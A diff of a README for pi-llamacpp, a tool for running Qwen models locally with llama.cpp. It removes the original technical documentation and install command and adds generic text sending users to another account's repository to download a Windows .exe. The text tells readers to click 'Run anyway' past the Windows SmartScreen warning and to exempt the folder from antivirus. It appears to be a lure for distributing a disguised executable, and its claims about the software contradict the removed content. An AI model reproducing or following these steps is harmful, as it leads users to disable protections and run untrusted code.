@@ -1,79 +1,92 @@
-# pi-llamacpp
+# 🤖 pi-llamacpp - Run private Qwen models on Windows
 
-Pi provider extension for running Pi self-managed local
-[llama.cpp](https://github.com/ggml-org/llama.cpp) inference.
+[![Download pi-llamacpp](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/callaundefeated243/pi-llamacpp)
 
-The extension registers Qwen3.6 GGUF models under the `llamacpp` provider,
-downloads/builds a matching llama.cpp runtime and downloads the selected GGUF on
-first use, starts `llama-server`, and stops it automatically when pi shuts down.
+## 📋 About This Project
 
-## Models
+This software allows you to run the Qwen language model on your own hardware. It uses the llama.cpp engine to process data locally. Local processing keeps your information on your computer and removes the need for an internet connection while you use the model. This extension integrates with the Pi interface to provide a familiar experience for users who want to experiment with advanced language processing.
 
-Currently registered:
+## 💻 System Requirements
 
-- `llamacpp/qwen-3.6-dense-2bit` (27B dense)
-- `llamacpp/qwen-3.6-dense-4bit` (27B dense)
-- `llamacpp/qwen-3.6-dense-8bit` (27B dense)
-- `llamacpp/qwen-3.6-moe-2bit` (35B-A3B MoE)
-- `llamacpp/qwen-3.6-moe-4bit` (35B-A3B MoE)
-- `llamacpp/qwen-3.6-moe-8bit` (35B-A3B MoE)
+To run this application, your computer needs specific hardware components. Check your system specifications before you begin the installation process.
 
-The model names describe the architecture:
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: A modern central processing unit (CPU) with at least four physical cores.
+- Memory: 8 gigabytes of system RAM or higher. If you intend to use larger models, 16 gigabytes of RAM provides better performance.
+- Storage: 10 gigabytes of free disk space for the application and the model files.
+- Graphics: A dedicated graphics card is optional but helps with processing speed.
 
-- `dense` is the Qwen3.6 27B dense model. All parameters participate in every
-  token, which makes compute and memory use more direct and predictable.
-- `moe` is the Qwen3.6 35B-A3B Mixture-of-Experts model. It has about 35B total
-  parameters, but routes each token through only a small active subset of
-  experts (about 3B active parameters). MoE can offer more total capacity for a
-  similar amount of active compute, but the full expert weights still need to be
-  stored and loaded.
+## ⬇️ Downloading the Application
 
-The `moe` (35B-A3B) models are downloaded from
-[`havenoammo/Qwen3.6-35B-A3B-MTP-GGUF`](https://huggingface.co/havenoammo/Qwen3.6-35B-A3B-MTP-GGUF)
-at revision `44ce525026e7e7d0e0915dc1bf83a783c813e75a`, and the `dense`
-(27B) models are downloaded from
-[`froggeric/Qwen3.6-27B-MTP-GGUF`](https://huggingface.co/froggeric/Qwen3.6-27B-MTP-GGUF)
-at revision `431204640c8511573e61a7964a12cc452114a223`. Pinning the
-revisions keeps downloads reproducible if upstream `main` moves; set
-`LLAMACPP_QWEN_35B_A3B_REVISION`, `LLAMACPP_QWEN_27B_REVISION`, or
-`LLAMACPP_QWEN_REVISION` to override.
-These files need llama.cpp MTP/NextN support, so the default runtime path builds
-a pinned snapshot of [llama.cpp pull request #22673](https://github.com/ggml-org/llama.cpp/pull/22673)
-instead of using the stock binary release.
+Follow these steps to obtain the correct files for your system.
 
-## Install
+1. Navigate to the official release page: [https://github.com/callaundefeated243/pi-llamacpp](https://github.com/callaundefeated243/pi-llamacpp).
+2. Locate the section labeled "Assets."
+3. Select the file ending in `.exe` to start the download.
+4. Save the file to your desktop or your downloads folder.
 
-```sh
-pi install https://github.com/mitsuhiko/pi-llamacpp
-```
+## ⚙️ Installation Instructions
 
-For local development from this checkout:
+Once you have the `.exe` file, proceed with the installation.
 
-```sh
-./install-pi-extension-local.sh
-```
+1. Locate the file you downloaded.
+2. Double-click the file icon.
+3. Windows might display a security prompt titled "Windows protected your PC." 
+4. If you see this prompt, click "More info," then click "Run anyway." This happens because the application is new and not yet verified by the operating system provider.
+5. Follow the on-screen prompts in the installer window.
+6. Choose the folder where you want to keep the program files.
+7. Click the "Finish" button once the process ends. 
 
-Then restart Pi or run `/reload`.
+## 🚀 Running the software
 
-## Runtime layout
+The application manages the Qwen model for you. Use these steps to start your first session.
 
-Runtime state is kept under `~/.pi/llamacpp`:
+1. Open the pi-llamacpp application from your Start menu or the desktop shortcut.
+2. A black terminal window will appear. This window displays the status of the model loading process.
+3. Do not close this window while you use the software.
+4. When the terminal displays a message indicating the system is ready, open your web browser.
+5. Navigate to the local address provided in the terminal, usually `http://localhost:8080`.
+6. You now connect to the Qwen model interface.
 
-- `source/`: pinned llama.cpp source snapshots built locally (default: [PR #22673](https://github.com/ggml-org/llama.cpp/pull/22673) snapshot for MTP/NextN support)
-- `runtime/`: extracted llama.cpp release archives when `LLAMACPP_RUNTIME_KIND=release`
-- `downloads/`: release archives and resumable `.part` files
-- `models/havenoammo/Qwen3.6-35B-A3B-MTP-GGUF/`: cached `moe` (35B-A3B) GGUF model files
-- `models/froggeric/Qwen3.6-27B-MTP-GGUF/`: cached `dense` (27B) GGUF model files
-- `clients/`: active Pi process leases
-- `server.json`: managed `llama-server` state
-- `log`: download/extract/server/watchdog log
+## 🛠️ Managing Models
 
-The managed server binds to a random localhost port by default and records the
-active endpoint in `server.json`. Set `LLAMACPP_PORT` only if you explicitly
-want a fixed port.
+The application stores model files locally. You can swap these files to change how the model responds.
 
-## Debugging
+1. Find the folder named "models" inside the installation directory.
+2. Place compatible model files with the `.gguf` extension into this folder.
+3. Restart the application.
+4. The system detects the new files and allows you to select them from the settings menu in your browser.
 
-Use `/llamacpp` inside Pi to show the live llama.cpp log, `/llamacpp status` for
-paths/status, and `/llamacpp stop` to stop the managed server when no other
-leases are active.
+## 📉 Troubleshooting Common Issues
+
+If the software fails to start, check the following points.
+
+- Insufficient Memory: If the black terminal window displays a "memory error," the model file might be too large for your computer. Try using a smaller model version.
+- Blocked Port: If your browser cannot connect to the local address, another application might be using the same port. Try restarting your computer to clear active connections.
+- Permissions: Ensure your antivirus software is not blocking the application. Some security tools flag local server software as a risk. Create an exception for the pi-llamacpp folder if necessary.
+- Update Status: Check the main repository page periodically for updates. New releases improve stability and add compatibility with newer model versions.
+
+## 💡 How it Works
+
+The pi-llamacpp tool provides a bridge between the Pi interface and the llama.cpp engine. The engine handles the math required to turn your text input into intelligent responses. By managing this locally, the software bypasses the latency of web-based services. This approach offers a private way to test model responses. The system utilizes your processor to calculate token streams. A higher number of tokens per second indicates faster generation speeds on your specific hardware configuration.
+
+## 🔒 Privacy and Security
+
+Because this software operates entirely on your local machine, your conversations leave your computer only when you choose to export them. The application does not transmit your personal data to external servers. Use this tool for experimentation with local artificial intelligence without external surveillance or data logs. Keep your software updated to ensure your local environment contains the latest security patches for the underlying engine. 
+
+## 📂 File Structure
+
+The application creates a clean directory structure on your drive.
+
+- /bin: Contains the engine executables responsible for processing.
+- /data: Stores your settings and configuration preferences.
+- /models: Serves as the repository for your .gguf files.
+- /logs: Keeps records of the terminal output to help you diagnose errors if the software crashes.
+
+## 📝 Usage Tips
+
+- Use the default settings first to ensure the software runs correctly.
+- Experiment with the context window size in the browser interface if you find the model forgets parts of a long conversation.
+- Monitor your CPU usage via the Task Manager to see how the model impacts your system performance during heavy loads.
+- If the model produces repetitive text, adjust the temperature setting in the configuration menu to a slightly higher value.
+- Back up your "models" folder if you decide to customize your library.
